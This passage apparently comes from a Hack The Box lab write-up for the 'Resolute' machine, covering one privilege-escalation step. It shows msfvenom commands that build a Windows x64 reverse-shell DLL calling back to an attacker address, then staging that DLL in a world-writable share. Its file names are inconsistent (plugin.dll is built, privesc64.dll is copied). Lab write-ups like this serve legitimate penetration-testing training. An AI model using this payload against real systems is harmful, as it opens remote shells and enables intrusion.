  4. Confirm the architecture and then create your .dll using msfvenom. Evil-WinRM PS C:> $env:PROCESSOR_ARCHITECTURE AMD64

    root@p3:/opt/htb/machines/resolute# msfvenom –platform=windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4400 -f dll -o plugin.dll No encoder or badchars specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 5120 bytes root@p3:/opt/htb/machines/resolute# cp privesc64.dll /srv/pub-share/ root@p3:/opt/htb/machines/resolute# chmod 777 /srv/pub-share/privesc64.dll

    NOTE: You NEED high privs on the .dll-file else it wont work.
